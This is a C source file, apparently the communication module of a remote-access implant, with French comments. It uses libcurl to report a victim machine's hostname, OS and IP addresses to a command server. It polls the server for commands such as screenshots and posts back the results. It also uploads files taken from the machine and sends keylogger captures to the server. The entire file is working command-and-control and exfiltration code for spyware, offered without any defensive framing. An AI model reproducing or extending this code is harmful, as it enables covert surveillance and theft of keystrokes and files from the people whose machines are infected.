#include "communication.h"
#include "../config.h"
#include <curl/curl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Callback curl : copie la réponse dans un buffer fixe passé en userdata */
static size_t write_cb(void *ptr, size_t size, size_t nmemb, void *buf) {
    strncat((char *)buf, (char *)ptr, size * nmemb);
    return size * nmemb;
}

int send_report(const char *url, const MachineReport *report) {
    char json[DATA_BUFFER];
    snprintf(json, sizeof(json),
             "{\"hostname\":\"%s\",\"os_info\":\"%s\","
             "\"private_ip\":\"%s\",\"public_ip\":\"%s\"}",
             report->hostname, report->os_info,
             report->private_ip, report->public_ip);

    char response[512] = {0};
    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");

    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    /* Extrait l'ID depuis la réponse : {"id": 42, ...} */
    int id = 0;
    char *pos = strstr(response, "\"id\":");
    if (pos) sscanf(pos + 5, " %d", &id);
    return id;
}

void get_command(int machine_id, char *out, size_t size) {
    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/command", SERVER_BASE_URL, machine_id);

    char response[512] = {0};
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    /* Extrait "command": "screenshot" ou "command": null → out reste vide */
    out[0] = '\0';
    char *pos = strstr(response, "\"command\":");
    if (pos) {
        pos += 10;
        while (*pos == ' ') pos++;
        if (*pos == '"') {
            pos++;
            size_t i = 0;
            while (*pos && *pos != '"' && i < size - 1)
                out[i++] = *pos++;
            out[i] = '\0';
        }
    }
}

void post_result(int machine_id, const char *result_json) {
    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/result", SERVER_BASE_URL, machine_id);

    /* Le serveur attend {"result": <json>} — on alloue sur le tas car result_json peut être grand */
    size_t len = strlen(result_json) + 16;
    char *payload = malloc(len);
    if (!payload) return;
    snprintf(payload, len, "{\"result\":%s}", result_json);

    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(payload);
}

void upload_file(int machine_id, const char *filepath, const char *filename) {
    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/upload", SERVER_BASE_URL, machine_id);

    CURL *curl = curl_easy_init();
    curl_mime *form      = curl_mime_init(curl);
    curl_mimepart *field = curl_mime_addpart(form);
    curl_mime_name(field, "file");
    curl_mime_filedata(field, filepath);
    curl_mime_filename(field, filename);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 60L);
    curl_easy_perform(curl);
    curl_mime_free(form);
    curl_easy_cleanup(curl);
}

void send_keylog(int machine_id, const char *data) {
    char url[BUFFER_SIZE];
    snprintf(url, sizeof(url), "%s/api/machines/%d/keylog", SERVER_BASE_URL, machine_id);

    struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: text/plain");
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
}
